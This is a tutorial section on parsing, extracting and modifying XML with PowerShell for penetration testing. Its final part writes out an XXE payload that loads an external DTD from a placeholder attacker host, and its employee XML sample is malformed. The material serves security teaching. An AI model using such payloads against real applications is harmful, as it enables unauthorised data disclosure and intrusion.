# XML in PowerShell

Penetration testing is a crucial activity in cybersecurity that involves simulating real-world attacks to identify vulnerabilities and weaknesses in a system or network. PowerShell, a versatile scripting language native to the Windows environment, is a valuable tool for penetration testers due to its flexibility, extensive automation capabilities, and ability to interact with various data formats, including XML. In this section, we will explore how PowerShell can be used to handle XML data as part of penetration testing. We will cover scenarios such as parsing XML files, extracting valuable information from XML nodes, and manipulating XML payloads for testing purposes

## Reading and parsing XML file

Penetration testers often encounter XML files containing configuration data or other sensitive information. PowerShell provides a simple way to read and parse XML files using the Get-Content cmdlet in conjunction with the Select-Xml cmdlet. Let’s read and parse an XML file that contains configuration settings for a web application:

```
$xmlFilePath = "C:\MyData\config.xml" 
$xmlContent = Get-Content -Path $xmlFilePath 
$xmlDoc = [xml]$xmlContent 
$setting1 = $xmlDoc.configuration.setting1 
$setting2 = $xmlDoc.configuration.setting2 
Write-Host "Setting 1: $setting1" 
Write-Host "Setting 2: $setting2"
```

In this example, we use the Get-Content cmdlet to read the content of the XML file specified by $xmlFilePath. We then cast the content to an XML object using the [xml] type accelerator. The XML object, represented by $xmlDoc, allows us to access individual elements and attributes within the XML.

## Extracting information from XML nodes 

XML files often contain nested structures with multiple nodes and attributes. PowerShell provides ways to navigate through these hierarchical structures and extract valuable information. Let us extract information from an XML file that contains data about employees. Let’s define the following XML:

```
<employees>
	<employee id="1">
		<name>Smukx</name>
		<age>20</age>
		<position>Manager</position>
	</employee>
	</employee>
</employees> 
```

Once we’ve defined the preceding XML, we can create the following PowerShell to process it:

```
$xmlFilePath = "C:\MyData\employees.xml"
$xmlContent = Get-Content -Path $xmlFilePath
$xmlDoc = [xml]$xmlContent
$employees = $xmlDoc.employees.employee
foreach ($employee in $employees) {
	$id = $employee.id
	$name = $employee.name
	$age = $employee.age
	$position = $employee.position
	Write-Host "Employee ID: $id"
	Write-Host "Name: $name"
	Write-Host "Age: $age"
	Write-Host "Position: $position"
	Write-Host ""
}
```

In this example, we read and parse the XML file using the same approach as before. We then access the employees node and iterate through each employee node using a for each loop. Within the loop, we extract information such as employee ID, name, age, and position from each node and display it.

## Modifying XML data

Penetration testers may need to modify XML data in certain scenarios, such as testing for input validation vulnerabilities or bypassing security controls. Let’s modify an XML file that contains user settings and save the updated XML back to the file. Let’s define the following XML:

```
<userSettings>
	 <setting name="theme" value="dark" />
	 <setting name="language" value="en-US" />
</userSettings>
```

Once we’ve defined the preceding XML, we can create the following PowerShell to process it:

```
$xmlFilePath = "C:\MyData\settings.xml"
$xmlContent = Get-Content -Path $xmlFilePath
$xmlDoc = [xml]$xmlContent
$xmlDoc.userSettings.setting | Where-Object { $_.name -eq "theme" } |
ForEach-Object {
	$_.value = "light"}
$xmlDoc.Save($xmlFilePath)
```

In this example, we read and parse the XML file as before. We then use the Where-Object cmdlet to filter the setting nodes based on the name attribute. Once we find the setting with the name theme, we modify its value attribute to light. Finally, we use the Save method to save the updated XML back to the file.

## Crafting XML payloads

During penetration testing, it is common to craft custom XML payloads to test for XML-based vulnerabilities such as XML External Entity (XXE) injection. Let’s craft an XML payload for testing an application for XXE vulnerabilities:

```
$payload = @"
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
%remote;
]>
<root>
	<data>Confidential Information</data>
</root>
"@

# To save the payload to an file 
$payloadFilePath = "C:\MyData\payload.xml"
$payload | Out-File -FilePath $payloadFilePath
```

In this example, we define an XML payload containing an external entity declaration that fetches an external Document Type Definition (DTD) file from the attacker’s server. This is a common XXE payload. We then save the payload to a file that can be used for testing XXE vulnerabilities.
